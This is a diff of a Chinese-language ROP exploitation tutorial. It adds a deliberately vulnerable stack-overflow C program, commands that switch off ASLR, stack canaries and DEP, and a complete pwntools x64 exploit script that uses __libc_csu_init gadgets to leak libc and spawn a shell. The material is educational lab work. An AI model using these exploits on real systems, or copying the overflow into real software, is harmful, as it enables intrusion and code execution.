@@ -6,10 +6,11 @@
     - [1.3. 系统防御](#13-系统防御)
     - [1.4. ROP的概念](#14-rop的概念)
 - [2. 准备工作](#2-准备工作)
-    - [2.1. 设置coredump](#21-设置coredump)
-    - [2.2. 解除安全措施的方法](#22-解除安全措施的方法)
-    - [2.3. SOCAT](#23-socat)
-    - [2.4. 其它](#24-其它)
+    - [2.1. 漏洞程序](#21-漏洞程序)
+    - [2.2. 设置coredump](#22-设置coredump)
+    - [2.3. 解除安全措施的方法](#23-解除安全措施的方法)
+    - [2.4. SOCAT](#24-socat)
+    - [2.5. 其它](#25-其它)
 - [3. X86](#3-x86)
 - [4. 开启DEP](#4-开启dep)
     - [4.1. ret2libc](#41-ret2libc)
@@ -21,13 +22,18 @@
 - [6. 无目标服务器so库](#6-无目标服务器so库)
     - [6.1. Memory Leak & DynELF](#61-memory-leak--dynelf)
     - [6.2. EXP](#62-exp)
-- [7. x64与x86的区别](#7-x64与x86的区别)
-- [8. 寻找gadgets](#8-寻找gadgets)
+- [7. x64](#7-x64)
+    - [7.1. x64与x86的区别](#71-x64与x86的区别)
+- [8. 通用gadgets](#8-通用gadgets)
+    - [8.1. __libc_csu_init](#81-__libc_csu_init)
+    - [8.2. _dl_runtime_resolve](#82-_dl_runtime_resolve)
+    - [8.3. 一个Tips](#83-一个tips)
 - [9. 工具](#9-工具)
     - [9.1. gadgets工具](#91-gadgets工具)
         - [9.1.1. ROPgadget](#911-ropgadget)
     - [9.2. pwntools](#92-pwntools)
     - [9.3. EDB](#93-edb)
+    - [9.4. objdump](#94-objdump)
 
 <!-- /TOC -->
 # 1. 概述
@@ -40,7 +46,22 @@
 ## 1.4. ROP的概念
 ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御。
 # 2. 准备工作
-## 2.1. 设置coredump
+## 2.1. 漏洞程序
+准备一个经典栈溢出漏洞程序。
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+void vulnerable_function() {
+    char buf[128];
+    read(STDIN_FILENO, buf, 512);
+}
+int main(int argc, char** argv) {
+    write(STDOUT_FILENO, "Hello, World\n", 13);
+    vulnerable_function();
+}
+```
+## 2.2. 设置coredump
 可以防止GDB调试环境下地址与实际运行环境下地址不同的情况。
 ```bash
 # 开启coredump
@@ -49,14 +70,14 @@ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
 # 调试coredump文件，第一个xxx为可执行文件名，第二个xxx为coredump文件名
 gdb xxx /tmp/core.xxx
 ```
-## 2.2. 解除安全措施的方法
+## 2.3. 解除安全措施的方法
 * GCC编译选项：`-fno-stack-protector`，用于关闭栈保护
 * GCC编译选项：`-z execstack`，用于关闭DEP
 * shell指令：`echo 0 > /proc/sys/kernel/randomize_va_space`，用于关闭ASLR，设置为2为启用ASLR
 * GCC编译选项：`-no-pie`，用于关闭PIE（程序基址版本的ASLR）
-## 2.3. SOCAT
+## 2.4. SOCAT
 `socat TCP4-LISTEN:10001,fork EXEC:./level1`，SOCAT可以将目标程序作为一个服务绑定到服务器的某个端口上
-## 2.4. 其它
+## 2.5. 其它
 * GCC编译选项：`-m32`，编译成32位程序
 # 3. X86
 ```python
@@ -102,7 +123,7 @@ p.interactive()
 ## 5.1. 通过偏移定位
 先获取到libc.so中某些函数的内存地址，然后通过so文件（使用ldd命令可以查看目标程序调用的so库在哪里）和偏移计算出`system`函数和`/bin/sh`字符串在内存中的地址。之后将程序返回到漏洞函数，再次进行溢出，通过`system`函数和`/bin/sh`字符串劫持程序流。
 ## 5.2. 获取libc.so中某些函数的内存地址
-由于程序本身在内存中的地址固定，我们可以获取到libc.so中某些函数在plt表和got表中的地址。利用objdump可以查看可以利用的plt函数（`objdump -d -j .plt level2`）和函数对应的got表（`objdump -R level2`）。例如，可以利用`write`函数可以把`write`函数在内存中的地址打印出来。
+我们可以通过objdump获取到libc.so中某些函数在plt表和got表中的地址，由于程序本身在内存中的地址固定（未启用PIE时），所以plt表和got表的静态地址等于内存地址。可以利用`write`函数把`write`函数在内存中的地址打印出来。
 ## 5.3. EXP
 ```python
 # encoding:utf-8
@@ -176,10 +197,86 @@ p.send(payload2)
 p.send("/bin/sh\0")
 p.interactive()
 ```
-# 7. x64与x86的区别
+# 7. x64
+## 7.1. x64与x86的区别
 * 内存地址范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常
 * 函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上
-# 8. 寻找gadgets
+# 8. 通用gadgets
+因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。默认gcc还会有如下自动编译进去的函数可以用来查找gadgets。
+```
+_init
+_start
+call_gmon_start
+deregister_tm_clones
+register_tm_clones
+__do_global_dtors_aux
+frame_dummy
+__libc_csu_init
+__libc_csu_fini
+_fini
+```
+## 8.1. __libc_csu_init
+一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。
+```python
+# encoding:utf-8
+# objdump -d ./level5观察到的__libc_csu_init()
+"""
+  4011c8:       4c 89 f2                mov    %r14,%rdx
+  4011cb:       4c 89 ee                mov    %r13,%rsi
+  4011ce:       44 89 e7                mov    %r12d,%edi
+  4011d1:       41 ff 14 df             callq  *(%r15,%rbx,8)
+  4011d5:       48 83 c3 01             add    $0x1,%rbx
+  4011d9:       48 39 dd                cmp    %rbx,%rbp
+  4011dc:       75 ea                   jne    4011c8 <__libc_csu_init+0x38>
+  4011de:       48 83 c4 08             add    $0x8,%rsp
+  4011e2:       5b                      pop    %rbx
+  4011e3:       5d                      pop    %rbp
+  4011e4:       41 5c                   pop    %r12
+  4011e6:       41 5d                   pop    %r13
+  4011e8:       41 5e                   pop    %r14
+  4011ea:       41 5f                   pop    %r15
+  4011ec:       c3                      retq   
+"""
+from pwn import *
+# 打开文件
+libc = ELF('libc.so.6')
+elf = ELF('level5')
+p = process('./level5')
+# 获取system函数的地址偏移
+got_write = elf.got['write']
+got_read = elf.got['read']
+main_addr = 0x401153
+p.recvuntil("\n")
+# 通过漏洞利用打印出write函数的内存地址
+# 136填充+返回地址+rbx+rbp+r12(rdi)+r13(rsi)+r14(rdx)+r15+retq
+raw_input("")
+payload1 = "A" * 136 + p64(0x4011e2) + p64(0) + p64(1) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(0x4011c8)
+# 填充栈，返回主函数
+payload1 += ("A" * 56 + p64(main_addr))
+p.send(payload1)
+write_addr = u64(p.recv(8))
+print "write address:" + hex(write_addr)
+system_addr = write_addr + (libc.symbols["system"] - libc.symbols["write"])
+print "system address:" + hex(system_addr)
+p.recvuntil("\n")
+# 发送第二段payload，写入binsh
+bss_addr = 0x0000000000404038
+payload2 = "A" * 136 + p64(0x4011e2) + p64(0) + p64(1) + p64(0) + p64(bss_addr) + p64(16) + p64(got_read) + p64(0x4011c8)
+# 填充栈，返回主函数
+payload2 += ("A" * 56 + p64(main_addr))
+p.send(payload2)
+p.send(p64(system_addr))
+p.send("/bin/sh\0")
+p.recvuntil("\n")
+# 发送第三段payload，执行
+payload3 = "A" * 136 + p64(0x4011e2) + p64(0) + p64(1) + p64(bss_addr+8) + p64(0) + p64(0) + p64(bss_addr) + p64(0x4011c8)
+p.send(payload3)
+p.interactive()
+```
+## 8.2. _dl_runtime_resolve
+通过这个gadget可以控制六个64位参数寄存器的值，当我们使用参数比较多的函数的时候（比如mmap和mprotect）就可以派上用场了。
+## 8.3. 一个Tips
+另外，通过控制PC跳转到某些经过稍微偏移过的地址（会改变程序原来的汇编代码）会得到意想不到的效果。
 # 9. 工具
 ## 9.1. gadgets工具
 * objdump（可用于寻找简单gadgets）：kali Linux自带
@@ -189,7 +286,7 @@ p.interactive()
 * rp++: https://github.com/0vercl0k/rp
 ### 9.1.1. ROPgadget
 Kali Linux自带该款工具：
-* ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi
+* ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi、
 ## 9.2. pwntools
 python库，可以极大的简化pwn的工作量。
 * 寻找bin文件中的字符串：next(ELF('libc.so.6').search('/bin/sh'))
@@ -197,3 +294,6 @@ python库，可以极大的简化pwn的工作量。
 * 寻找bin文件中plt表和got表中对应函数的地址：ELF('libc.so.6').plt['system']；ELF('libc.so.6').got['system']
 ## 9.3. EDB
 EDB调试器，Linux下的GUI调试器，对标OD。
+## 9.4. objdump
+* 查看可执行文件中的plt表：`objdump -d -j .plt level2`
+* 查看可执行文件中的got表：`objdump -R level2`
